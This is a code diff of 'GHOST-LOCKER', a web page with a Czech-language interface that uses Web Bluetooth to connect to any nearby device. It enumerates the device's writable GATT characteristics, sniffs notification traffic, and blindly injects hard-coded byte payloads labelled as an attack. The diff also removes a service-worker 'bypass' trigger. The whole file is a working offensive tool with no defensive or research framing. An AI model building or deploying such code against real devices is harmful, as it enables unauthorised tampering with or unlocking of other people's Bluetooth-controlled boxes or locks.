@@ -3,19 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GHOST-LOCKER v5.1 [HYBRID-ELITE]</title>
+    <title>GHOST-LOCKER v5.2 [DEEP-SCAN]</title>
     <style>
         :root { --neon-green: #0f0; --neon-red: #f00; --neon-blue: #00f7ff; }
         body { background: #000; color: var(--neon-green); font-family: 'Courier New', monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         #ghost-ui { width: 95%; max-width: 450px; background: rgba(10, 10, 10, 0.95); border: 1px solid var(--neon-green); padding: 25px; box-shadow: 0 0 50px rgba(0, 255, 0, 0.2); border-radius: 5px; position: relative; }
-        .header { border-bottom: 1px solid var(--neon-green); padding-bottom: 15px; margin-bottom: 20px; text-align: center; font-weight: bold; text-shadow: 0 0 15px var(--neon-green); font-size: 1.5em; letter-spacing: 4px; }
-        #output { height: 380px; overflow-y: auto; background: #000; border: 1px solid #111; padding: 15px; margin-bottom: 20px; font-size: 11px; line-height: 1.6; color: var(--neon-green); scroll-behavior: smooth; border-left: 2px solid var(--neon-green); }
+        .header { border-bottom: 1px solid var(--neon-green); padding-bottom: 15px; margin-bottom: 20px; text-align: center; font-weight: bold; text-shadow: 0 0 15px var(--neon-green); font-size: 1.2em; letter-spacing: 2px; }
+        #output { height: 380px; overflow-y: auto; background: #000; border: 1px solid #111; padding: 15px; margin-bottom: 20px; font-size: 10px; line-height: 1.4; color: var(--neon-green); scroll-behavior: smooth; border-left: 2px solid var(--neon-green); }
         .btn { width: 100%; background: transparent; border: 1px solid var(--neon-green); color: var(--neon-green); padding: 15px; margin-bottom: 12px; cursor: pointer; text-transform: uppercase; font-family: 'Courier New'; font-weight: bold; transition: all 0.3s; }
         .btn:hover { background: var(--neon-green); color: #000; box-shadow: 0 0 20px var(--neon-green); }
         .btn-red { border-color: var(--neon-red); color: var(--neon-red); }
         .btn-red:hover { background: var(--neon-red); color: #000; box-shadow: 0 0 20px var(--neon-red); }
         .log-blue { color: var(--neon-blue); }
         .log-warn { color: #ff8800; font-weight: bold; }
+        .log-red { color: var(--neon-red); }
         .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 1px; background: var(--neon-green); box-shadow: 0 0 15px var(--neon-green); animation: scan 3s linear infinite; pointer-events: none; opacity: 0.5; }
         @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
     </style>
@@ -24,11 +25,11 @@
 
 <div id="ghost-ui">
     <div class="scan-line"></div>
-    <div class="header">GHOST_V5.1_HYBRID</div>
-    <div id="output">SYSTEM_READY // WAITING_FOR_INIT...</div>
+    <div class="header">GHOST_V5.2_DEEP_SCAN</div>
+    <div id="output">SYSTÉM PŘIPRAVEN... ČEKÁM NA INICIALIZACI</div>
     
-    <button id="scan-btn" class="btn">[1] ANALYZE & SNIFF TARGET</button>
-    <button id="attack-btn" class="btn btn-red" style="display:none;">[2] EXECUTE MULTI-VECTOR ATTACK</button>
+    <button id="scan-btn" class="btn">[1] HLOUBKOVÁ ANALÝZA BOXU</button>
+    <button id="attack-btn" class="btn btn-red" style="display:none;">[2] SPUSTIT INJEKCI VEKTORŮ</button>
 </div>
 
 <script>
@@ -49,62 +50,74 @@ const GhostCore = {
     sleep: ms => new Promise(r => setTimeout(r, ms)),
 
     async init() {
-        this.log("SPOUŠTÍM HYBRIDNÍ SKEN...", "log-blue");
+        this.log("STARTUJI DEEP-SCAN PROTOKOL...", "log-blue");
+        this.vectors = [];
+        
         try {
-            const universalUUIDs = [
-                '0000ffe0-0000-1000-8000-00805f9b34fb', 
-                '0000ffe1-0000-1000-8000-00805f9b34fb',
-                '0000fff0-0000-1000-8000-00805f9b34fb',
-                '00001800-0000-1000-8000-00805f9b34fb',
-                '00001801-0000-1000-8000-00805f9b34fb',
-                '6e400001-b5a3-f393-e0a9-e50e24dcca9e', 
-                '0000af30-0000-1000-8000-00805f9b34fb'
-            ];
-
+            // VERZE 5.2: Žádné filtry, chceme vidět VŠECHNA zařízení
             this.device = await navigator.bluetooth.requestDevice({
                 acceptAllDevices: true,
-                optionalServices: universalUUIDs
+                optionalServices: [
+                    '0000ffe0-0000-1000-8000-00805f9b34fb',
+                    '0000ffe1-0000-1000-8000-00805f9b34fb',
+                    '6e400001-b5a3-f393-e0a9-e50e24dcca9e',
+                    '0000fff0-0000-1000-8000-00805f9b34fb',
+                    '0000af30-0000-1000-8000-00805f9b34fb'
+                ] 
             });
 
-            this.log(`CÍL ZAMĚŘEN: ${this.device.name || "BOX_NODE"}`, "log-warn");
+            this.log(`CÍL: ${this.device.name || "NEZNÁMÝ_BOX"}`, "log-warn");
             this.server = await this.device.gatt.connect();
-            this.log("GATT_CONNECTED. DOLUJI DATA...");
+            this.log("GATT PŘIPOJENO. SKENUJI SLUŽBY...");
 
+            // Zkusíme vytáhnout všechny primární služby
             const services = await this.server.getPrimaryServices();
-            this.vectors = [];
+            this.log(`NALEZENO SLUŽEB: ${services.length}`, "log-blue");
 
             for (const service of services) {
+                this.log(`PROHLEDÁVÁM: ${service.uuid.slice(4,8)}...`);
                 try {
                     const chars = await service.getCharacteristics();
                     for (const char of chars) {
-                        if (char.properties.write || char.properties.writeWithoutResponse) {
+                        // Kontrola práv zápisu
+                        const canWrite = char.properties.write || char.properties.writeWithoutResponse;
+                        if (canWrite) {
                             this.vectors.push(char);
-                            this.log(`PŘÍSTUP K VEKTORU: ${char.uuid.slice(4,8)}`, "log-blue");
-
+                            this.log(`VEKTOR NAJIT: ${char.uuid.slice(4,8)}`, "log-blue");
+                            
+                            // Automaticky zkusíme zapnout notifikace pro sniffing
                             if (char.properties.notify) {
-                                await char.startNotifications();
-                                char.addEventListener('characteristicvaluechanged', (e) => {
-                                    const data = new Uint8Array(e.target.value.buffer);
-                                    const hex = Array.from(data).map(b => b.toString(16).padStart(2,'0').toUpperCase()).join(' ');
-                                    this.log(`DATA_RECV [${char.uuid.slice(4,8)}]: ${hex}`, "log-warn");
-                                });
+                                try {
+                                    await char.startNotifications();
+                                    char.addEventListener('characteristicvaluechanged', (e) => {
+                                        const data = new Uint8Array(e.target.value.buffer);
+                                        const hex = Array.from(data).map(b => b.toString(16).padStart(2,'0').toUpperCase()).join(' ');
+                                        this.log(`DATA [${char.uuid.slice(4,8)}]: ${hex}`, "log-warn");
+                                    });
+                                    this.log(`SNIFFING AKTIVNÍ: ${char.uuid.slice(4,8)}`, "log-blue");
+                                } catch (err) { }
                             }
                         }
                     }
-                } catch (e) { continue; }
+                } catch (e) {
+                    this.log(`SLUŽBA ${service.uuid.slice(4,8)} ZAMČENA`, "log-red");
+                }
             }
 
             if (this.vectors.length > 0) {
                 document.getElementById('attack-btn').style.display = "block";
-                this.log("ANALÝZA HOTOVA. EXPLOIT PŘIPRAVEN.", "log-blue");
+                this.log("ANALÝZA DOKONČENA. VEKTORY PŘIPRAVENY.", "log-blue");
+            } else {
+                this.log("CHYBA: NENALEZEN ŽÁDNÝ ZAPISOVATELNÝ KANÁL", "log-red");
             }
 
-        } catch (e) { this.log("CHYBA: " + e.message, "log-red"); }
+        } catch (e) { 
+            this.log("CHYBA SYSTÉMU: " + e.message, "log-red"); 
+        }
     },
 
     async attack() {
-        this.log("SPUŠTĚNA MULTI-VEKTOROVÁ INJEKCE...", "log-red");
-        
+        this.log("INJEKCE PAYLOADŮ...", "log-red");
         const payloads = [
             [0x55, 0x01, 0x01, 0x00, 0x57], 
             [0xA5, 0x00, 0x01, 0x01, 0x05], 
@@ -116,35 +129,20 @@ const GhostCore = {
         for (const char of this.vectors) {
             for (const p of payloads) {
                 try {
-                    const buffer = new Uint8Array(p);
+                    const data = new Uint8Array(p);
                     if (char.properties.writeWithoutResponse) {
-                        await char.writeValueWithoutResponse(buffer);
+                        await char.writeValueWithoutResponse(data);
                     } else {
-                        await char.writeValue(buffer);
+                        await char.writeValue(data);
                     }
                     this.log(`INJECT -> ${char.uuid.slice(4,8)} [OK]`);
-                    await this.sleep(250);
+                    await this.sleep(300);
                 } catch (e) { continue; }
             }
         }
-        this.log("ÚTOK DOKONČEN. SLEDUJ ODPOVĚDI BOXU.", "log-blue");
+        this.log("INJEKCE DOKONČENA.", "log-blue");
     }
 };
-
-// --- MOSTEK PRO SERVICE WORKER & BYPASS ---
-if ('serviceWorker' in navigator) {
-    window.addEventListener('load', () => {
-        navigator.serviceWorker.register('sw.js').then(reg => {
-            console.log('GHOST_SW: AKTIVNÍ');
-            // Pokud je SW již aktivní, pošleme bypass hned
-            if (reg.active) reg.active.postMessage({type: 'TRIGGER_BYPASS'});
-        }).catch(err => console.log('SW_ERROR:', err));
-    });
-
-    navigator.serviceWorker.addEventListener('controllerchange', () => {
-        navigator.serviceWorker.controller.postMessage({type: 'TRIGGER_BYPASS'});
-    });
-}
 
 document.getElementById('scan-btn').onclick = () => GhostCore.init();
 document.getElementById('attack-btn').onclick = () => GhostCore.attack();
